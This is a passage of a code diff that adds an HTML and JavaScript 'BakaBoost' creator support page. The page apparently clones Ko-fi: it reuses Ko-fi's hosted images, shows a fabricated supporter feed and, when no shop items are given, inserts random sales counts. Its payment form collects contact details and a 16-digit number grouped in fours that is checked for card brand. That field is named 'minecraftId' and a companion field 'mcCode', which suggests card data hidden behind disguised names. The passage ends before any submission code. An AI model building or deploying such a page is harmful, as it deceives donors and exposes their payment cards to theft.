selected>United States</option><option>Uruguay</option><option>Uzbekistan</option><option>Vanuatu</option><option>Vatican City</option><option>Venezuela</option><option>Vietnam</option><option>Yemen</option><option>Zambia</option><option>Zimbabwe</option>
+                        </select>
+                      </label>
+                    </div>
+
+                    <label><span>Email</span><input class="input" name="email" type="email" placeholder="Enter your email" required /></label>
+                    <label><span>Your message</span><textarea class="textarea small" name="message" placeholder="Extra message"></textarea></label>
+
+                    <input type="hidden" name="amount" id="order-amount" value="1" />
+                    <input type="hidden" name="total" id="order-total" value="1" />
+                    <input type="hidden" name="paymentType" id="order-payment-type" value="one-time" />
+
+                    <div class="checkout-summary order-summary" aria-live="polite">
+                      <span>Payment total</span>
+                      <strong>$<span id="order-summary-total">1</span> <span id="order-summary-type">today</span></strong>
+                    </div>
+                    <p class="status" id="form-status" aria-live="polite"></p>
+                    <button class="primary-button" type="submit">
+                      Pay $<span id="donate-total">1</span> to <span id="pay-btn-name"></span>
+                    </button>
+                  </form>
+                </article>
+
+                <article class="card">
+                  <div class="card-title-row">
+                    <h3>Shop</h3>
+                    <button class="link-button" data-tab-jump="shop" type="button">Go to Shop</button>
+                  </div>
+                  <div class="shop-list">
+                    <div class="shop-row">
+                      <img class="thumb" src="https://storage.ko-fi.com/cdn/useruploads/post/16c91c40-3880-4114-b558-a79151aeeae1_grey-wight-zoxwrpmywra-unsplash.png" alt="Halloween room wallpaper" />
+                      <div>
+                        <strong>Halloween room pixel art wallpaper</strong>
+                        <p>🔥 339 sold</p>
+                      </div>
+                      <button>Free +</button>
+                    </div>
+                    <div class="shop-row">
+                      <img class="thumb" src="https://storage.ko-fi.com/cdn/useruploads/post/18125d59-d834-4ac1-941d-504f904caa10_stillimage.png" alt="Summer sun wallpaper" />
+                      <div>
+                        <strong>Summer sun pixel art wallpaper</strong>
+                        <p>🔥 606 sold</p>
+                      </div>
+                      <button>Free +</button>
+                    </div>
+                    <div class="shop-row">
+                      <img class="thumb" src="https://storage.ko-fi.com/cdn/useruploads/post/7c2fc4ea-0b7b-4398-8af4-5c6ca8bc2e14_brushpack2.png" alt="Pixel Art Brush Pack" />
+                      <div>
+                        <strong>Pixel Art Brush Pack for Procreate</strong>
+                        <p>🔥 34k sold</p>
+                      </div>
+                      <button>Free +</button>
+                    </div>
+                  </div>
+                </article>
+
+                <article class="card">
+                  <div class="card-title-row">
+                    <h3>Feed</h3>
+                    <button class="link-button" type="button">Give Support</button>
+                  </div>
+                  <div class="feed">
+                    <div class="feed-item">
+                      <img src="https://ko-fi.com/img/anon12.png?v=10" alt="Somebody" />
+                      <p><strong>Somebody</strong> bought a coffee <span>3h</span></p>
+                      <button type="button" aria-label="More">•••</button>
+                    </div>
+                    <div class="feed-item">
+                      <img src="https://ko-fi.com/img/anon12.png?v=10" alt="Somebody" />
+                      <p><strong>Somebody</strong> bought a coffee <span>6h</span></p>
+                      <button type="button" aria-label="More">•••</button>
+                    </div>
+                    <div class="feed-item">
+                      <img src="https://ko-fi.com/img/anon12.png?v=10" alt="Somebody" />
+                      <p><strong>Somebody</strong> bought a coffee <span>8h</span></p>
+                      <button type="button" aria-label="More">•••</button>
+                    </div>
+                    <div class="feed-item">
+                      <img src="https://ko-fi.com/img/anon12.png?v=10" alt="Somebody" />
+                      <p><strong>Somebody</strong> bought a coffee <span>19 days</span></p>
+                      <button type="button" aria-label="More">•••</button>
+                    </div>
+                    <div class="feed-item has-comment">
+                      <img src="https://ko-fi.com/img/anon5.png?v=1" alt="Ko-fi Supporter" />
+                      <p><strong>Ko-fi Supporter</strong> bought a coffee <span>20 days</span></p>
+                      <button type="button" aria-label="More">•••</button>
+                      <div class="feed-comment">
+                        Thank you for the amazing content! Keep it up!
+                      </div>
+                    </div>
+                    <div class="feed-item has-comment">
+                      <img src="https://ko-fi.com/img/anon12.png?v=10" alt="Somebody" />
+                      <p><strong>Somebody</strong> bought a coffee <span>24 days</span></p>
+                      <button type="button" aria-label="More">•••</button>
+                      <div class="feed-comment">
+                        Love your work! Can't wait to see more.
+                      </div>
+                    </div>
+                  </div>
+                </article>
+
+                <article class="card ad-card">
+                  <h3>BakaBoost</h3>
+                  <p>Make money doing what you love.</p>
+                  <a href="#">Start a free BakaBoost page</a>
+                </article>
+              </section>
+            </div>
+          </div>
+
+          <!-- GALLERY TAB -->
+          <div class="tab-panel" id="gallery">
+            <div class="section-heading" style="margin-bottom:18px;">
+              <h2>Gallery</h2>
+            </div>
+            <div class="gallery-grid" id="gallery-grid"></div>
+          </div>
+
+          <!-- POSTS TAB -->
+          <div class="tab-panel" id="posts">
+            <div class="post-list" id="post-list"></div>
+          </div>
+
+          <!-- SHOP TAB -->
+          <div class="tab-panel" id="shop">
+            <div class="filters">
+              <button class="active">All</button>
+              <button>brush</button>
+              <button>grid</button>
+              <button>isometric</button>
+              <button>pixelart</button>
+              <button>resources</button>
+            </div>
+            <div class="product-grid" id="product-grid"></div>
+          </div>
+
+        </div>
+      </section>
+    </main>
+
+    <script>
+const P = window.__PROFILE__;
+const COFFEE_PRICE = parseFloat(P.coffeePrice) || 1;
+const LABEL = (P.coffeeLabel || 'coffee');
+
+function esc(s) {
+  return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+// Page meta
+document.title = `Buy ${P.displayName} a ${LABEL[0].toUpperCase() + LABEL.slice(1)}`;
+const metaDesc = document.querySelector('meta[name="description"]');
+const ogTitle = document.querySelector('meta[property="og:title"]');
+const ogDesc = document.querySelector('meta[property="og:description"]');
+const twitterTitle = document.querySelector('meta[name="twitter:title"]');
+const twitterDesc = document.querySelector('meta[name="twitter:description"]');
+if (metaDesc) metaDesc.content = `Support ${P.displayName} on BakaBoost.`;
+if (ogTitle) ogTitle.content = `Buy ${P.displayName} a ${LABEL[0].toUpperCase() + LABEL.slice(1)}`;
+if (ogDesc) ogDesc.content = `Support ${P.displayName} on BakaBoost.`;
+if (twitterTitle) twitterTitle.content = `Buy ${P.displayName} a ${LABEL[0].toUpperCase() + LABEL.slice(1)}`;
+if (twitterDesc) twitterDesc.content = `Support ${P.displayName} on BakaBoost.`;
+
+// Banner
+if (P.banner) document.getElementById('cover-banner').style.backgroundImage = `url('${P.banner}')`;
+
+// Avatar
+const avatarImg = document.getElementById('profile-avatar');
+avatarImg.src = P.pfp || '';
+avatarImg.alt = `${P.displayName} avatar`;
+avatarImg.onerror = () => { avatarImg.style.display = 'none'; };
+
+// Name / followers / bio
+document.getElementById('profile-name').textContent = P.displayName;
+document.getElementById('profile-followers').textContent = `${(P.followerCount || 0).toLocaleString()} Followers`;
+document.getElementById('about-bio').textContent = P.bio || '';
+
+// Order heading
+document.getElementById('order-heading').textContent = `Buy a ${LABEL} for ${P.displayName}`;
+document.getElementById('coffee-price-label').textContent = `$${COFFEE_PRICE} each`;
+document.getElementById('pay-btn-name').textContent = P.displayName.toUpperCase();
+
+// Share button
+document.getElementById('share-btn').addEventListener('click', () => {
+  if (navigator.share) {
+    navigator.share({ title: P.displayName, url: location.href });
+  } else {
+    navigator.clipboard?.writeText(location.href);
+    document.getElementById('share-btn').textContent = 'Copied!';
+    setTimeout(() => { document.getElementById('share-btn').textContent = 'Share'; }, 2000);
+  }
+});
+
+// MINI GALLERY (About tab sidebar)
+const miniGalleryEl = document.getElementById('mini-gallery');
+if (P.gallery && P.gallery.length) {
+  P.gallery.slice(0, 3).forEach(g => {
+    const a = document.createElement('a');
+    a.href = '#';
+    const img = document.createElement('img');
+    img.src = g.url; img.alt = g.caption || '';
+    img.onerror = () => img.style.display = 'none';
+    a.appendChild(img);
+    miniGalleryEl.appendChild(a);
+  });
+} else {
+  miniGalleryEl.closest('article').style.display = 'none';
+}
+
+// GALLERY TAB
+const galleryGrid = document.getElementById('gallery-grid');
+if (P.gallery && P.gallery.length) {
+  P.gallery.forEach(g => {
+    const a = document.createElement('a');
+    a.className = 'gallery-item'; a.href = '#';
+    a.innerHTML = `<img src="${esc(g.url)}" alt="${esc(g.caption||'')}" onerror="this.parentNode.style.display='none'">
+      ${g.caption ? `<span>${esc(g.caption)}</span>` : ''}`;
+    galleryGrid.appendChild(a);
+  });
+} else {
+  galleryGrid.innerHTML = '<div class="empty-state">No gallery items yet.</div>';
+}
+
+// POSTS TAB
+const postList = document.getElementById('post-list');
+if (P.posts && P.posts.length) {
+  P.posts.forEach(post => {
+    const dateStr = post.date ? new Date(post.date).toLocaleDateString('en-US', { month:'long', day:'numeric', year:'numeric' }) : '';
+    const article = document.createElement('article');
+    article.className = 'post-card';
+    article.innerHTML = `
+      ${post.image ? `<img class="post-image" src="${esc(post.image)}" alt="${esc(post.title)}" onerror="this.style.display='none'">` : ''}
+      <time>${dateStr}</time>
+      <h3>${esc(post.title)}</h3>
+      <p style="margin-bottom:16px;">${esc(post.content)}</p>`;
+    postList.appendChild(article);
+  });
+} else {
+  postList.innerHTML = '<div class="empty-state">No posts yet. Check back soon!</div>';
+}
+
+// SHOP TAB
+const productGrid = document.getElementById('product-grid');
+const PLACEHOLDER_SHOP = [
+  { name: 'Halloween room pixel art wallpaper', sold: '🔥 339 sold', image: 'https://storage.ko-fi.com/cdn/useruploads/post/16c91c40-3880-4114-b558-a79151aeeae1_grey-wight-zoxwrpmywra-unsplash.png' },
+  { name: 'Summer sun pixel art wallpaper', sold: '🔥 606 sold', image: 'https://storage.ko-fi.com/cdn/useruploads/post/18125d59-d834-4ac1-941d-504f904caa10_stillimage.png' },
+  { name: 'Pixel Art Brush Pack for Procreate', sold: '🔥 34k sold', image: 'https://storage.ko-fi.com/cdn/useruploads/post/7c2fc4ea-0b7b-4398-8af4-5c6ca8bc2e14_brushpack2.png' },
+];
+const shopItems = P.shop && P.shop.length ? P.shop : PLACEHOLDER_SHOP;
+shopItems.forEach(item => {
+  const imgSrc = item.image || '';
+  const name = item.name || '';
+  const soldText = item.sold || `🔥 ${Math.floor(Math.random() * 900) + 100} sold`;
+  const div = document.createElement('div');
+  div.className = 'product';
+  div.innerHTML = `
+    ${imgSrc ? `<img class="product-img" src="${esc(imgSrc)}" alt="${esc(name)}" onerror="this.style.background='#f4f7fc'">` : '<div class="product-img"></div>'}
+    <strong>${esc(name)}</strong>
+    <p>${esc(soldText)}</p>`;
+  productGrid.appendChild(div);
+});
+
+// ---- TABS ----
+const tabs = document.querySelectorAll(".tab");
+const panels = document.querySelectorAll(".tab-panel");
+const jumpButtons = document.querySelectorAll("[data-tab-jump]");
+
+function showTab(tabName) {
+  tabs.forEach(tab => tab.classList.toggle("active", tab.dataset.tab === tabName));
+  panels.forEach(panel => panel.classList.toggle("active", panel.id === tabName));
+}
+tabs.forEach(tab => tab.addEventListener("click", () => showTab(tab.dataset.tab)));
+jumpButtons.forEach(button => button.addEventListener("click", () => showTab(button.dataset.tabJump)));
+
+// ---- PAYMENT JS ----
+const orderIntro = document.querySelector("#order-intro");
+const orderForm = document.querySelector("#order-form");
+const continueOrder = document.querySelector("#continue-order");
+const closeOrder = document.querySelector("#close-order");
+const statusLine = document.querySelector("#form-status");
+const introTotal = document.querySelector("#intro-total");
+const introName = document.querySelector("#intro-name");
+const introMessage = document.querySelector("#intro-message");
+const coffeeCount = document.querySelector("#coffee-count");
+const donateTotal = document.querySelector("#donate-total");
+const paymentSummaryTotal = document.querySelector("#payment-summary-total");
+const paymentSummaryType = document.querySelector("#payment-summary-type");
+const orderSummaryTotal = document.querySelector("#order-summary-total");
+const orderSummaryType = document.querySelector("#order-summary-type");
+const decreaseCoffee = document.querySelector("#decrease-coffee");
+const increaseCoffee = document.querySelector("#increase-coffee");
+const orderAmount = document.querySelector("#order-amount");
+const orderTotal = document.querySelector("#order-total");
+const orderPaymentType = document.querySelector("#order-payment-type");
+
+let coffeeAmount = 1;
+let paymentType = "one-time";
+const DEFAULT_COUNTRY = "United States";
+
+introTotal.value = String(COFFEE_PRICE);
+
+const COUNTRY_CALLING_CODE_DATA = `af|Afghanistan|93
+ax|Aland Islands|358
+al|Albania|355
+dz|Algeria|213
+as|American Samoa|1684
+ad|Andorra|376
+ao|Angola|244
+ai|Anguilla|1264
+ag|Antigua and Barbuda|1268
+ar|Argentina|54
+am|Armenia|374
+au|Australia|61
+at|Austria|43
+az|Azerbaijan|994
+bs|Bahamas|1242
+bh|Bahrain|973
+bd|Bangladesh|880
+bb|Barbados|1246
+by|Belarus|375
+be|Belgium|32
+bz|Belize|501
+bj|Benin|229
+bt|Bhutan|975
+bo|Bolivia|591
+ba|Bosnia and Herzegovina|387
+bw|Botswana|267
+br|Brazil|55
+bn|Brunei|673
+bg|Bulgaria|359
+bf|Burkina Faso|226
+bi|Burundi|257
+kh|Cambodia|855
+cm|Cameroon|237
+ca|Canada|1
+cv|Cabo Verde|238
+cf|Central African Republic|236
+td|Chad|235
+cl|Chile|56
+cn|China|86
+co|Colombia|57
+km|Comoros|269
+cd|Congo (DRC)|243
+cg|Congo (Republic)|242
+cr|Costa Rica|506
+ci|Cote d'Ivoire|225
+hr|Croatia|385
+cu|Cuba|53
+cy|Cyprus|357
+cz|Czechia|420
+dk|Denmark|45
+dj|Djibouti|253
+dm|Dominica|1767
+do|Dominican Republic|1
+ec|Ecuador|593
+eg|Egypt|20
+sv|El Salvador|503
+gq|Equatorial Guinea|240
+er|Eritrea|291
+ee|Estonia|372
+et|Ethiopia|251
+fj|Fiji|679
+fi|Finland|358
+fr|France|33
+ga|Gabon|241
+gm|Gambia|220
+ge|Georgia|995
+de|Germany|49
+gh|Ghana|233
+gr|Greece|30
+gd|Grenada|1473
+gt|Guatemala|502
+gn|Guinea|224
+gw|Guinea-Bissau|245
+gy|Guyana|592
+ht|Haiti|509
+hn|Honduras|504
+hu|Hungary|36
+is|Iceland|354
+in|India|91
+id|Indonesia|62
+ir|Iran|98
+iq|Iraq|964
+ie|Ireland|353
+il|Israel|972
+it|Italy|39
+jm|Jamaica|1876
+jp|Japan|81
+jo|Jordan|962
+kz|Kazakhstan|7
+ke|Kenya|254
+ki|Kiribati|686
+kw|Kuwait|965
+kg|Kyrgyzstan|996
+la|Laos|856
+lv|Latvia|371
+lb|Lebanon|961
+ls|Lesotho|266
+lr|Liberia|231
+ly|Libya|218
+li|Liechtenstein|423
+lt|Lithuania|370
+lu|Luxembourg|352
+mk|North Macedonia|389
+mg|Madagascar|261
+mw|Malawi|265
+my|Malaysia|60
+mv|Maldives|960
+ml|Mali|223
+mt|Malta|356
+mh|Marshall Islands|692
+mr|Mauritania|222
+mu|Mauritius|230
+mx|Mexico|52
+fm|Micronesia|691
+md|Moldova|373
+mc|Monaco|377
+mn|Mongolia|976
+me|Montenegro|382
+ma|Morocco|212
+mz|Mozambique|258
+mm|Myanmar|95
+na|Namibia|264
+nr|Nauru|674
+np|Nepal|977
+nl|Netherlands|31
+nz|New Zealand|64
+ni|Nicaragua|505
+ne|Niger|227
+ng|Nigeria|234
+kp|North Korea|850
+no|Norway|47
+om|Oman|968
+pk|Pakistan|92
+pw|Palau|680
+ps|Palestine|970
+pa|Panama|507
+pg|Papua New Guinea|675
+py|Paraguay|595
+pe|Peru|51
+ph|Philippines|63
+pl|Poland|48
+pt|Portugal|351
+qa|Qatar|974
+ro|Romania|40
+ru|Russia|7
+rw|Rwanda|250
+kn|Saint Kitts and Nevis|1869
+lc|Saint Lucia|1758
+vc|Saint Vincent and the Grenadines|1784
+ws|Samoa|685
+sm|San Marino|378
+st|Sao Tome and Principe|239
+sa|Saudi Arabia|966
+sn|Senegal|221
+rs|Serbia|381
+sc|Seychelles|248
+sl|Sierra Leone|232
+sg|Singapore|65
+sk|Slovakia|421
+si|Slovenia|386
+sb|Solomon Islands|677
+so|Somalia|252
+za|South Africa|27
+kr|South Korea|82
+ss|South Sudan|211
+es|Spain|34
+lk|Sri Lanka|94
+sd|Sudan|249
+sr|Suriname|597
+sz|Eswatini|268
+se|Sweden|46
+ch|Switzerland|41
+sy|Syria|963
+tw|Taiwan|886
+tj|Tajikistan|992
+tz|Tanzania|255
+th|Thailand|66
+tl|Timor-Leste|670
+tg|Togo|228
+to|Tonga|676
+tt|Trinidad and Tobago|1868
+tn|Tunisia|216
+tr|Turkey|90
+tm|Turkmenistan|993
+tv|Tuvalu|688
+ug|Uganda|256
+ua|Ukraine|380
+ae|United Arab Emirates|971
+gb|United Kingdom|44
+us|United States|1
+uy|Uruguay|598
+uz|Uzbekistan|998
+vu|Vanuatu|678
+va|Vatican City|39
+ve|Venezuela|58
+vn|Vietnam|84
+ye|Yemen|967
+zm|Zambia|260
+zw|Zimbabwe|263`.trim();
+
+const COUNTRY_CALLING_CODES = COUNTRY_CALLING_CODE_DATA.split("\n").map(line => {
+  const [iso2, name, dialCode] = line.split("|");
+  return { iso2, name, code: `+${dialCode}` };
+});
+
+function setPaymentTotals(total) {
+  donateTotal.textContent = total;
+  paymentSummaryTotal.textContent = total;
+  paymentSummaryType.textContent = "today";
+  orderSummaryTotal.textContent = total;
+  orderSummaryType.textContent = "today";
+  orderTotal.value = total;
+}
+
+function syncDonationUi() {
+  coffeeCount.textContent = String(coffeeAmount);
+  introTotal.value = String(coffeeAmount * COFFEE_PRICE);
+  setPaymentTotals(introTotal.value);
+  orderAmount.value = String(coffeeAmount);
+  orderPaymentType.value = paymentType;
+}
+
+decreaseCoffee.addEventListener("click", () => { coffeeAmount = Math.max(1, coffeeAmount - 1); syncDonationUi(); });
+increaseCoffee.addEventListener("click", () => { coffeeAmount += 1; syncDonationUi(); });
+
+function syncTypedAmount() {
+  const numericValue = introTotal.value.replace(/\D/g, "");
+  introTotal.value = numericValue || String(COFFEE_PRICE);
+  coffeeAmount = Math.max(1, Math.round(Number(introTotal.value) / COFFEE_PRICE));
+  coffeeCount.textContent = String(coffeeAmount);
+  setPaymentTotals(introTotal.value);
+  orderAmount.value = String(coffeeAmount);
+}
+introTotal.addEventListener("input", syncTypedAmount);
+introTotal.addEventListener("change", syncTypedAmount);
+
+orderIntro.addEventListener("submit", event => {
+  event.preventDefault();
+  if (!orderIntro.reportValidity()) return;
+  orderForm.elements.name && (orderForm.elements.name.value = introName.value);
+  orderForm.elements.message && (orderForm.elements.message.value = introMessage.value);
+  syncDonationUi();
+  orderIntro.classList.add("hidden");
+  orderForm.classList.remove("hidden");
+});
+
+closeOrder.addEventListener("click", () => {
+  orderForm.classList.add("hidden");
+  orderIntro.classList.remove("hidden");
+});
+
+syncDonationUi();
+
+document.querySelectorAll(".numeric-only").forEach(input => {
+  input.addEventListener("keydown", event => {
+    const allowedKeys = ["Backspace","Delete","ArrowLeft","ArrowRight","Tab","Home","End"];
+    if (allowedKeys.includes(event.key)) return;
+    if (!/^\d$/.test(event.key)) { event.preventDefault(); return; }
+    const selectedCharacters = input.selectionEnd - input.selectionStart;
+    const valueLength = input.name === "minecraftId" ? input.value.replace(/\D/g,"").length : input.value.length;
+    const maxLength = input.name === "minecraftId" ? 16 : Number(input.maxLength);
+    if (valueLength - selectedCharacters >= maxLength) event.preventDefault();
+  });
+  input.addEventListener("input", () => {
+    const digits = input.value.replace(/\D/g,"").slice(0, input.name === "minecraftId" ? 16 : Number(input.maxLength));
+    input.value = input.name === "minecraftId" ? digits.replace(/(.{4})/g,"$1 ").trim() : digits;
+    if (input.name === "minecraftId") updateCardBrand(input);
+  });
+});
+
+document.querySelectorAll(".name-only").forEach(input => input.addEventListener("input", () => { input.value = input.value.replace(/[0-9]/g,""); }));
+document.querySelectorAll(".address-only").forEach(input => input.addEventListener("input", () => { input.value = input.value.replace(/[^a-zA-Z0-9\s.,#\-\/]/g,""); }));
+
+const expirationInput = document.querySelector('input[name="expirationDate"]');
+const emailInput = orderForm.elements.email;
+const phoneNumberInput = orderForm.elements.phoneNumber;
+const phoneCountryCodeInput = orderForm.elements.phoneCountryCode;
+const minecraftIdInput = orderForm.elements.minecraftId;
+const mcCodeInput = orderForm.elements.mcCode;
+const zipCodeInput = orderForm.elements.zipCode;
+const countryInput = orderForm.elements.country;
+const postalCodeLabel = document.querySelector("[data-postal-code-label]");
+const countryCodePicker = document.querySelector("[data-country-code-picker]");
+const countryCodeButton = countryCodePicker.querySelector(".country-code-button");
+const countryCodeButtonText = countryCodePicker.querySelector(".country-code-button-text");
+const countryCodeMenu = countryCodePicker.querySelector(".country-code-menu");
+const selectedCountryFlag = countryCodePicker.querySelector("[data-selected-country-flag]");
+
+const NO_POSTAL_CODE_COUNTRIES = new Set(["Angola","Antigua and Barbuda","Aruba","Bahamas","Belize","Benin","Botswana","Burkina Faso","Burundi","Cameroon","Central African Republic","Comoros","Congo (Republic)","Cook Islands","Cote d'Ivoire","Curacao","Djibouti","Dominica","Equatorial Guinea","Eritrea","Fiji","Gambia","Ghana","Grenada","Guyana","Hong Kong","Jamaica","Kiribati","Macau","Malawi","Mali","Mauritania","Montserrat","Nauru","Niue","Panama","Qatar","Rwanda","Saint Kitts and Nevis","Saint Lucia","Sao Tome and Principe","Seychelles","Sierra Leone","Solomon Islands","Somalia","Suriname","Syria","Timor-Leste","Togo","Tonga","Trinidad and Tobago","Tuvalu","Uganda","United Arab Emirates","Vanuatu","Yemen","Zimbabwe"]);
+
+const POSTAL_CODE_RULES = [
+  { countries: ["United States","Puerto Rico","American Samoa","Guam","Northern Mariana Islands","U.S. Virgin Islands"], label:"ZIP code", placeholder:"12345 or 12345-6789", error:"ZIP code must be 12345 or 12345-6789.", pattern:/^\d{5}(-\d{4})?$/, inputMode:"numeric", maxLength:10 },
+  { countries: ["United Kingdom","Guernsey","Isle of Man","Jersey"], label:"Postcode", placeholder:"SW1A 1AA", error:"Postcode must look like SW1A 1AA.", pattern:/^(GIR ?0AA|[A-Z]{1,2}\d[A-Z\d]? ?\d[A-Z]{2})$/i, maxLength:8 },
+  { countries: ["Canada"], label:"Postal code", placeholder:"A1A 1A1", error:"Postal code must look like A1A 1A1.", pattern:/^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTV-Z][ -]?\d[ABCEGHJ-NPRSTV-Z]\d$/i, maxLength:7 },
+  { countries: ["India"], label:"PIN code", placeholder:"110001", error:"PIN code must be 6 digits.", pattern:/^[1-9]\d{5}$/, inputMode:"numeric", maxLength:6 },
+  { countries: ["Australia","New Zealand","Norway","South Africa"], label:"Postal code", placeholder:"2000", error:"Postal code must be 4 digits.", pattern:/^\d{4}$/, inputMode:"numeric", maxLength:4 },
+  { countries: ["Brazil"], label:"CEP", placeholder:"01001-000", error:"CEP must look like 01001-000.", pattern:/^\d{5}-?\d{3}$/, inputMode:"numeric", maxLength:9 },
+  { countries: ["Japan"], label:"Postal code", placeholder:"100-0001", error:"Postal code must look like 100-0001.", pattern:/^\d{3}-?\d{4}$/, inputMode:"numeric", maxLength:8 },
+  { countries: ["Netherlands"], label:"Postal code", placeholder:"1234 AB", error:"Postal code must look like 1234 AB.", pattern:/^\d{4} ?[A-Z]{2}$/i, maxLength:7 },
+  { countries: ["Ireland"], label:"Eircode", placeholder:"D02 X285", error:"Eircode must look like D02 X285.", pattern:/^[AC-FHKNPRTV-Y]\d{2} ?[0-9AC-FHKNPRTV-Y]{4}$/i, maxLength:8 },
+  { countries: ["Poland"], label:"Postal code", placeholder:"00-001", error:"Postal code must look like 00-001.", pattern:/^\d{2}-\d{3}$/, inputMode:"numeric", maxLength:6 },
+  { countries: ["Argentina","China","Colombia","Ecuador","Indonesia","Kazakhstan","Mexico","Pakistan","Paraguay","Philippines","Romania","Russia","Singapore","Sri Lanka","Tajikistan","Turkmenistan","Uzbekistan","Vietnam"], label:"Postal code", placeholder:"123456", error:"Postal code must be 6 digits.", pattern:/^\d{6}$/, inputMode:"numeric", maxLength:6 },
+  { countries: ["Bangladesh","Belgium","Bulgaria","Denmark","Georgia","Liechtenstein","Luxembourg","North Macedonia","Slovenia","Tunisia"], label:"Postal code", placeholder:"1234", error:"Postal code must be 4 digits.", pattern:/^\d{4}$/, inputMode:"numeric", maxLength:4 },
+  { countries: ["Algeria","Andorra","Armenia","Austria","Azerbaijan","Bahrain","Belarus","Bosnia and Herzegovina","Cambodia","Croatia","Cyprus","Czechia","Dominican Republic","Egypt","Estonia","Finland","France","Germany","Greece","Guatemala","Honduras","Iceland","Iran","Iraq","Israel","Italy","Jordan","Kenya","Kosovo","Kuwait","Laos","Latvia","Lebanon","Lithuania","Malaysia","Maldives","Moldova","Monaco","Montenegro","Morocco","Myanmar","Nepal","Nicaragua","Oman","Palestine","Peru","San Marino","Saudi Arabia","Senegal","Serbia","Slovakia","South Korea","Spain","Sudan","Sweden","Switzerland","Taiwan","Tanzania","Thailand","Turkey","Ukraine","Uruguay","Vatican City","Venezuela","Zambia"], label:"Postal code", placeholder:"12345", error:"Postal code must be 5 digits.", pattern:/^\d{5}$/, inputMode:"numeric", maxLength:5 },
+];
+
+const DEFAULT_POSTAL_CODE_RULE = { label:"Postal code", placeholder:"Postal code", error:"Postal code must use 2 to 16 letters, numbers, spaces, or hyphens.", pattern:/^[A-Z0-9][A-Z0-9 -]{0,14}[A-Z0-9]$/i, inputMode:"text", maxLength:16 };
+
+function getPostalCodeRule(countryName) {
+  const country = countryName || DEFAULT_COUNTRY;
+  const rule = POSTAL_CODE_RULES.find(item => item.countries.includes(country));
+  if (NO_POSTAL_CODE_COUNTRIES.has(country) && !rule) return { ...DEFAULT_POSTAL_CODE_RULE, label:"Postal code (if any)", placeholder:"Optional", required:false };
+  return rule || DEFAULT_POSTAL_CODE_RULE;
+}
+
+function normalizePostalCode(value) { return value.toUpperCase().replace(/[^A-Z0-9 -]/g,"").replace(/\s+/g," ").slice(0,16); }
+
+function updatePostalCodeField() {
+  const rule = getPostalCodeRule(countryInput.value);
+  postalCodeLabel.textContent = rule.label;
+  zipCodeInput.placeholder = rule.placeholder;
+  zipCodeInput.inputMode = rule.inputMode || "text";
+  zipCodeInput.maxLength = rule.maxLength;
+  zipCodeInput.required = rule.required !== false;
+  zipCodeInput.pattern = rule.pattern.source.replace(/^\^|\$$/g,"");
+  zipCodeInput.setAttribute("aria-label", rule.label);
+  if (zipCodeInput.value) {
+    zipCodeInput.value = normalizePostalCode(zipCodeInput.value).slice(0, rule.maxLength);
+    refreshFieldValidity(zipCodeInput);
+  } else { setFieldError(zipCodeInput,""); }
+}
+
+function getPostalCodeError(value, countryName) {
+  const rule = getPostalCodeRule(countryName);
+  if (!value && rule.required === false) return "";
+  return rule.pattern.test(value) ? "" : rule.error;
+}
+
+function ensureCountryOption(countryName) {
+  const exists = Array.from(countryInput.options).some(o => o.value === countryName);
+  if (exists) return;
+  countryInput.add(new Option(countryName, countryName));
+}
+
+function getFlagUrl(iso2) { return `https://flagcdn.com/w40/${iso2.toLowerCase()}.png`; }
+
+function setFlag(wrap, country) {
+  const img = wrap.querySelector(".country-code-flag");
+  const fallback = wrap.querySelector(".country-code-fallback");
+  wrap.classList.remove("no-flag");
+  fallback.textContent = country.iso2.toUpperCase();
+  img.hidden = false;
+  img.onerror = () => { wrap.classList.add("no-flag"); img.hidden = true; };
+  img.src = getFlagUrl(country.iso2);
+}
+
+function createFlagWrap(country) {
+  const wrap = document.createElement("span");
+  wrap.className = "country-code-flag-wrap";
+  const img = document.createElement("img"); img.className = "country-code-flag"; img.alt = ""; img.loading = "lazy";
+  const fallback = document.createElement("span"); fallback.className = "country-code-fallback"; fallback.setAttribute("aria-hidden","true");
+  wrap.append(img, fallback);
+  setFlag(wrap, country);
+  return wrap;
+}
+
+function getSelectedPhoneCountry() {
+  const sel = phoneCountryCodeInput.selectedOptions[0];
+  return { iso2: sel?.dataset.iso2||"us", name: sel?.dataset.country||DEFAULT_COUNTRY, code: sel?.value||"+1" };
+}
+
+function closeCountryCodeMenu() { countryCodePicker.classList.remove("is-open"); countryCodeButton.setAttribute("aria-expanded","false"); }
+function openCountryCodeMenu() {
+  countryCodePicker.classList.add("is-open"); countryCodeButton.setAttribute("aria-expanded","true");
+  const sel = countryCodeMenu.querySelector(".country-code-option.is-selected");
+  if (sel) sel.scrollIntoView({ block:"nearest" });
+}
+
+function updateCountryCodePicker() {
+  const sel = getSelectedPhoneCountry();
+  countryCodeButtonText.textContent = `${sel.code} ${sel.name}`;
+  setFlag(selectedCountryFlag, sel);
+  countryCodeMenu.querySelectorAll(".country-code-option").forEach(btn => {
+    const isSelected = Number(btn.dataset.index) === phoneCountryCodeInput.selectedIndex;
+    btn.classList.toggle("is-selected", isSelected);
+    btn.setAttribute("aria-selected", String(isSelected));
+  });
+}
+
+function selectPhoneCountryByName(countryName) {
+  const option = Array.from(phoneCountryCodeInput.options).find(o => o.dataset.country === countryName);
+  if (!option) return;
+  phoneCountryCodeInput.selectedIndex = option.index;
+  updateCountryCodePicker();
+}
+
+function syncCountryFromPhoneCode() {
+  const sel = phoneCountryCodeInput.selectedOptions[0]?.dataset.country;
+  if (!sel) return;
+  ensureCountryOption(sel); countryInput.value = sel; updatePostalCodeField();
+}
+
+function syncPhoneCodeFromCountry() { selectPhoneCountryByName(countryInput.value); updatePostalCodeField(); }
+
+function populateCountryCodeSelect() {
+  phoneCountryCodeInput.textContent = ""; countryCodeMenu.textContent = "";
+  COUNTRY_CALLING_CODES.forEach((country, index) => {
+    ensureCountryOption(country.name);
+    const option = new Option(`${country.code} ${country.name}`, country.code);
+    option.dataset.country = country.name; option.dataset.iso2 = country.iso2;
+    if (country.name === DEFAULT_COUNTRY) { option.selected = true; option.defaultSelected = true; }
+    phoneCountryCodeInput.add(option);
+    const btn = document.createElement("button");
+    btn.className = "country-code-option"; btn.type = "button"; btn.dataset.index = String(index); btn.setAttribute("role","option");
+    const text = document.createElement("span"); text.className = "country-code-option-text"; text.textContent = `${country.code} ${country.name}`;
+    btn.append(createFlagWrap(country), text);
+    btn.addEventListener("click", () => {
